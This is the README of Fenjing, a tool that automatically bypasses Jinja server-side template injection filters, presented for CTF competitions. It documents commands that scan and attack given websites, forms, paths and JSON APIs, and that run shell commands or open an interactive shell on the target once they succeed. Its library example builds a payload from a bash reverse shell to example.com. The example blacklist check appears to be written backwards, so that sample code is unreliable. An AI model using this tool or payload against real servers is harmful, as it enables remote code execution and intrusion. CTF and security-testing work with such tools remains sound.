![Fenjing](assets/fenjing.webp)

> Bypass the WAF without knowing WAF


[![Run tests](https://github.com/Marven11/Fenjing/raw/images/assets/run-tests.svg)](https://github.com/Marven11/Fenjing/actions/workflows/run-tests.yml)
[![Upload Python Package](https://github.com/Marven11/Fenjing/raw/images/assets/python-package.svg)](https://github.com/Marven11/Fenjing/actions/workflows/python-publish.yml)
[![codecov](https://github.com/Marven11/Fenjing/raw/images/assets/codecov.svg)](https://codecov.io/gh/Marven11/Fenjing)
[![Downloads](https://github.com/Marven11/Fenjing/raw/images/assets/downloads.svg)](https://pepy.tech/project/fenjing)
[![Downloads](https://github.com/Marven11/Fenjing/raw/images/assets/downloads-monthly.svg)](https://pepy.tech/project/fenjing)
![Static Badge](https://github.com/Marven11/Fenjing/raw/images/assets/license.svg)

Fenjing is a script for bypassing Jinja SSTI WAF in CTF competitions. It supports automatically attacking given website or API.

## Demo

[![asciicast](assets/demo.gif)](https://asciinema.org/a/dMEIPe5NS9eZpQU9T06xZutHh)

## Features

- Intergrade most of the CTF SSTI WAF bypass tricks.
- Automatic parameter discovery.
- Automatically generate payload by analyzing WAF. 
- Crack by HTTP parameters or URI path
- Automatically detect and bypass keyword replacement.
- ......

## Installation

### With pipx (recommened)

```shell
#pip install pipx
pipx install fenjing
fenjing webui
# fenjing scan --url 'http://xxxx:xxx'
```

### WIth pip

```shell
pip install fenjing
fenjing webui
# fenjing scan --url 'http://xxxx:xxx'
```

### With docker images

```shell
docker run --net host -it marven11/fenjing webui
```

## Usage

### Webui

Run `python -m fenjing webui` to launch webui, specify parameter and crack.

Currently webui only supports Chinese, i18n is on its way.

![webui-example](assets/webui-example.png)

Fill in your target and click `Analyze`, and type your command one the right.

### scan

`scan` function is for guessing and cracking parameters of a URL. It supports detecting API parameters from HTML form and from parameter discovery.

`python -m fenjing scan --url 'http://xxxx:xxx/yyy'`

### crack

You can also use `crack` to specify parameters and crack:

`python -m fenjing crack --url 'http://xxxx:xxx/yyy' --detect-mode fast --inputs aaa,bbb --method GET`

Here we provide 2 parameters, `aaa` and `bbb`, to crack. And use `--detect-mode fast` to accelerate cracking.

### crack-request

You can also write the HTTP request into a text file (`req.txt` for example), and tell fenjing to crack with it.

For example, `req.txt` is shown below:

```http
GET /?name=PAYLOAD HTTP/1.1
Host: 127.0.0.1:5000
Connection: close

```

And launch fenjing with:

`python -m fenjing crack-request -f req.txt --host '127.0.0.1' --port 5000`

### Tab completion

[Reference](https://click.palletsprojects.com/en/8.1.x/shell-completion/) to configure your shell.

Examples:

bash

```bash
cat >> ~/.bashrc << EOF
eval "$(_FENJING_COMPLETE=bash_source fenjing)"
EOF
```

zsh

```shell
cat >> ~/.zshrc << EOF
eval "$(_FENJING_COMPLETE=zsh_source fenjing)"
EOF
```

fish

```shell
echo '_FENJING_COMPLETE=fish_source fenjing | source' > ~/.config/fish/completions/fenjing.fish
```

Tab completion only supports `fenjing ...`, not `python -m fenjing`

## Project details 

program structure:


[![](https://mermaid.ink/img/pako:eNp1VD1vwyAQ_SsWUjNEcbt76FB17dROrSPrgo8YFYPLR5M0yn8vxmnAH2VA3OPd3eM4OBOqaiQFYUIdaAPaZm9Ppcz8MG6319A1mbNcmGwA-0GVUJr_YEQ0fjk0FnWEmNJt6iKNjeawQllPMxnUOZc-EAOKaUrBPxiYgkHuN1suQfTYNjIOuHM9Z9dzGNfI1HEAt6MwWZ4_DvhNRDZRQTXQT9Qm8RuQJBuwijlJqz3KiPoILbejMhgKsnJazGIFHQsO6fZylhRdihLKWsrJoTo4CQV1cqi7u6z2daKWK3m79OtlWTza6hvSGpgGhaiuYUZkxvdznLnIHusfe2SrceRwoqlzAFN79Y9I7QSayp46nIGhiyO4KC0wH9br--60yAw6ElK0h5xe1yzZ9TrS9hu10x847pRhDn264JL0yLzOpSQb0vpXArz2D_vc-5TENthiSQq_lOisBlGSUl48FZxVrydJSWG1ww3Ryu0b4p-RMN5yXQ0Wnzn4NmpvaAfyXaloY82t0i_DVxJ-lMsvGyVeZA?type=png)](https://mermaid.live/edit#pako:eNp1VD1vwyAQ_SsWUjNEcbt76FB17dROrSPrgo8YFYPLR5M0yn8vxmnAH2VA3OPd3eM4OBOqaiQFYUIdaAPaZm9Ppcz8MG6319A1mbNcmGwA-0GVUJr_YEQ0fjk0FnWEmNJt6iKNjeawQllPMxnUOZc-EAOKaUrBPxiYgkHuN1suQfTYNjIOuHM9Z9dzGNfI1HEAt6MwWZ4_DvhNRDZRQTXQT9Qm8RuQJBuwijlJqz3KiPoILbejMhgKsnJazGIFHQsO6fZylhRdihLKWsrJoTo4CQV1cqi7u6z2daKWK3m79OtlWTza6hvSGpgGhaiuYUZkxvdznLnIHusfe2SrceRwoqlzAFN79Y9I7QSayp46nIGhiyO4KC0wH9br--60yAw6ElK0h5xe1yzZ9TrS9hu10x847pRhDn264JL0yLzOpSQb0vpXArz2D_vc-5TENthiSQq_lOisBlGSUl48FZxVrydJSWG1ww3Ryu0b4p-RMN5yXQ0Wnzn4NmpvaAfyXaloY82t0i_DVxJ-lMsvGyVeZA)

[howitworks.md](./howitworks.md)

Supported Bypass Rules

### Character Bypass

- `'` and `"`
- `_`
- `[`
- Most sensitive keywords
- Any Arabic numerals
- `+`
- `-`
- `*`
- `~`
- `{{`
- `%`
- ...

### Numeric Bypass

Supports bypassing 0-9 and arithmetic operations simultaneously, using methods such as:

- Hexadecimal
- a\*b+c
- `(39,39,20)|sum`
- `(x,x,x)|length`
- Unicode characters

The above rules support nesting.

### `'%c'` Bypass

Supports bypassing quotes, `g`, `lipsum`, and `urlencode`, etc.

### Underscore Bypass

Supports `(lipsum|escape|batch(22)|list|first|last)`, etc.
- The number 22 in the above rule supports the numeric bypass mentioned earlier.

### Arbitrary String

Supports bypassing quotes, arbitrary string concatenation symbols, underscores, and arbitrary keywords.

Supports the following forms:

- `'str'`
- `"str"`
- `"\x61\x61\x61"`
- `dict(__class__=x)|join`
    - The underscore in the above rule supports bypassing.
- `'%c'*3%(97,97, 97)`
    - The `'%c'` in the above rule also supports the `'%c'` bypass mentioned earlier.
    - All numbers in the above rule support the numeric bypass mentioned earlier.
- Splitting the string into small segments and generating them separately
- ...

### **Attribute**

- `['aaa']`
- `.aaa`
- `|attr('aaa')`

### **Item**

- `['aaa']`
- `.aaa`
- `.__getitem__('aaa')`

Other Technical Details

- The script pre-generates some strings and sets them using {%set %} at the beginning.
- The script sets some variables at the beginning of the payload to provide for the expressions in the latter part.
- The script generates shorter expressions automatically.
- The script carefully checks the priority of each expression, trying to avoid generating unnecessary parentheses.

## Detailed Usage

### Using as a Command-Line Script

Introduction to each function:

- webui: Web UI
  - As the name suggests, a web-based UI
  - Default port is 11451
- scan: Scan the entire website
  - Extract all forms from the website based on form elements and attack them
  - Discover parameter by URL and extract other URLs in the HTML.
  - After a successful scan, provide a simulated terminal or execute a given command
  - Example: `python -m fenjing scan --url 'http://xxx/'`
- crack: Attack a specific form
  - Requires specifying the form's URL, action (GET or POST), and all fields (e.g., 'name')
  - After a successful attack, provide a simulated terminal or execute a given command
  - Example: `python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
- crack-path: Attack a specific path
  - Attack vulnerabilities existing in a specific path (e.g., `http://xxx.xxx/hello/<payload>`)
  - Parameters are similar to those of crack, but only require providing the corresponding path
  - Example: `python -m fenjing crack-path --url 'http://xxx/hello/'`
- crack-request: Read a request file and attack
  - Read the requests in the file, replace `PAYLOAD` with the actual payload, and submit
  - By default, urlencode the request according to HTTP format, can be turned off with `--urlencode-payload 0`
- crack-json: Attack a specified JSON API
  - Attack a specific key in the JSON body of an API
  - Example: `python -m fenjing crack-json --url 'http://xxx/crackjson' --json-data '{"name": "admin", "age": 24, "msg": ""}' --key msg`
- crack-keywords: Read all keywords from a file and attack
  - Read all keywords from a .txt or .json file and generate corresponding payloads for a given shell command
  - Example: `python -m fenjing crack-keywords -k waf.json -o payload.jinja2 --command 'ls /'`


Some special options:
- `--eval-args-payload`: Place the payload in the GET parameter x and submit
- `--detect-mode`: Detection mode, can be accurate or fast
- `--environment`: Specify the rendering environment for the template, default is assumed to be in Flask's `render_template_string`
- `--tamper-cmd`: Encode the payload before sending
  - Examples:
    - `--tamper-cmd 'rev'`: Reverse the payload before sending
    - `--tamper-cmd 'base64'`: Encode the payload with base64 before sending
    - `--tamper-cmd 'base64 | rev'`: Encode the payload with base64 and reverse it before sending
- For detailed explanations, see [examples.md](examples.md)


```
Usage: python -m fenjing scan [OPTIONS]

  扫描指定的网站

Options:
  --no-verify-ssl                 不验证SSL证书
  --proxy TEXT                    请求时使用的代理
  --extra-data TEXT               请求时的额外POST参数，如a=1&b=2
  --extra-params TEXT             请求时的额外GET参数，如a=1&b=2
  --cookies TEXT                  请求时使用的Cookie
  --header TEXT                   请求时使用的Headers
  --user-agent TEXT               请求时使用的User Agent
  -u, --url TEXT                  需要攻击的URL  [required]
  --interval FLOAT                每次请求的间隔
  --tamper-cmd TEXT               在发送payload之前进行编码的命令，默认不进行额外操作
  --waf-keyword TEXT              手动指定waf页面含有的关键字，此时不会自动检测waf页面的哈希等。可指定多个关键字
  --detect-waf-keywords DETECTWAFKEYWORDS
                                  是否枚举被waf的关键字，需要额外时间，默认为none, 可选full/fast
  --environment TEMPLATEENVIRONMENT
                                  模板的执行环境，默认为不带flask全局变量的普通jinja2
  --replaced-keyword-strategy REPLACEDKEYWORDSTRATEGY
                                  WAF替换关键字时的策略，可为avoid/ignore/doubletapping
  --detect-mode DETECTMODE        分析模式，可为accurate或fast
  -e, --exec-cmd TEXT             成功后执行的shell指令，不填则成功后进入交互模式
  --help                          Show this message and exit.

Usage: python -m fenjing crack [OPTIONS]

  攻击指定的表单

Options:
  --no-verify-ssl                 不验证SSL证书
  --proxy TEXT                    请求时使用的代理
  --extra-data TEXT               请求时的额外POST参数，如a=1&b=2
  --extra-params TEXT             请求时的额外GET参数，如a=1&b=2
  --cookies TEXT                  请求时使用的Cookie
  --header TEXT                   请求时使用的Headers
  --user-agent TEXT               请求时使用的User Agent
  -u, --url TEXT                  需要攻击的URL  [required]
  --interval FLOAT                每次请求的间隔
  --tamper-cmd TEXT               在发送payload之前进行编码的命令，默认不进行额外操作
  --waf-keyword TEXT              手动指定waf页面含有的关键字，此时不会自动检测waf页面的哈希等。可指定多个关键字
  --detect-waf-keywords DETECTWAFKEYWORDS
                                  是否枚举被waf的关键字，需要额外时间，默认为none, 可选full/fast
  --environment TEMPLATEENVIRONMENT
                                  模板的执行环境，默认为不带flask全局变量的普通jinja2
  --replaced-keyword-strategy REPLACEDKEYWORDSTRATEGY
                                  WAF替换关键字时的策略，可为avoid/ignore/doubletapping
  --detect-mode DETECTMODE        分析模式，可为accurate或fast
  -e, --exec-cmd TEXT             成功后执行的shell指令，不填则成功后进入交互模式
  -a, --action TEXT               参数的提交路径，如果和URL中的路径不同则需要填入
  -m, --method TEXT               参数的提交方式，默认为POST
  -i, --inputs TEXT               所有参数，以逗号分隔  [required]
  --eval-args-payload             是否开启在GET参数中传递Eval payload的功能
  --help                          Show this message and exit.

Usage: python -m fenjing crack-request [OPTIONS]

  从文本文件中读取请求并攻击目标，文本文件中用`PAYLOAD`标记payload插入位置

Options:
  --interval FLOAT                每次请求的间隔
  --tamper-cmd TEXT               在发送payload之前进行编码的命令，默认不进行额外操作
  --waf-keyword TEXT              手动指定waf页面含有的关键字，此时不会自动检测waf页面的哈希等。可指定多个关键字
  --detect-waf-keywords DETECTWAFKEYWORDS
                                  是否枚举被waf的关键字，需要额外时间，默认为none, 可选full/fast
  --environment TEMPLATEENVIRONMENT
                                  模板的执行环境，默认为不带flask全局变量的普通jinja2
  --replaced-keyword-strategy REPLACEDKEYWORDSTRATEGY
                                  WAF替换关键字时的策略，可为avoid/ignore/doubletapping
  --detect-mode DETECTMODE        分析模式，可为accurate或fast
  -e, --exec-cmd TEXT             成功后执行的shell指令，不填则成功后进入交互模式
  -h, --host TEXT                 目标的host，可为IP或域名  [required]
  -p, --port INTEGER              目标的端口  [required]
  -f, --request-file TEXT         保存在文本文件中的请求，其中payload处为PAYLOAD  [required]
  --toreplace BYTES               请求文件中payload的占位符
  --ssl / --no-ssl                是否使用SSL
  --urlencode-payload BOOLEAN     是否对payload进行urlencode
  --raw                           不检查请求的换行符等
  --retry-times INTEGER           重试次数
  --update-content-length BOOLEAN
                                  自动更新Content-Length
  --help                          Show this message and exit.

Usage: python -m fenjing crack-path [OPTIONS]

  攻击指定的路径

Options:
  --no-verify-ssl                 不验证SSL证书
  --proxy TEXT                    请求时使用的代理
  --extra-data TEXT               请求时的额外POST参数，如a=1&b=2
  --extra-params TEXT             请求时的额外GET参数，如a=1&b=2
  --cookies TEXT                  请求时使用的Cookie
  --header TEXT                   请求时使用的Headers
  --user-agent TEXT               请求时使用的User Agent
  -u, --url TEXT                  需要攻击的URL  [required]
  --interval FLOAT                每次请求的间隔
  --tamper-cmd TEXT               在发送payload之前进行编码的命令，默认不进行额外操作
  --waf-keyword TEXT              手动指定waf页面含有的关键字，此时不会自动检测waf页面的哈希等。可指定多个关键字
  --detect-waf-keywords DETECTWAFKEYWORDS
                                  是否枚举被waf的关键字，需要额外时间，默认为none, 可选full/fast
  --environment TEMPLATEENVIRONMENT
                                  模板的执行环境，默认为不带flask全局变量的普通jinja2
  --replaced-keyword-strategy REPLACEDKEYWORDSTRATEGY
                                  WAF替换关键字时的策略，可为avoid/ignore/doubletapping
  --detect-mode DETECTMODE        分析模式，可为accurate或fast
  -e, --exec-cmd TEXT             成功后执行的shell指令，不填则成功后进入交互模式
  --help                          Show this message and exit.

Usage: python -m fenjing webui [OPTIONS]

  启动webui

Options:
  -h, --host TEXT                 需要监听的host, 默认为127.0.0.1
  -p, --port INTEGER              需要监听的端口, 默认为11451
  --open-browser / --no-open-browser
                                  是否自动打开浏览器
  --help                          Show this message and exit.
```

### Use as a python library

[example.py](example.py)

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    print(f"{config_payload=}")

```

Other examples (Chinese): [examples.md](examples.md)

## Stars

[![Stargazers over time](https://github.com/Marven11/Fenjing/raw/images/assets/stars.svg)](https://starchart.cc/Marven11/Fenjing)
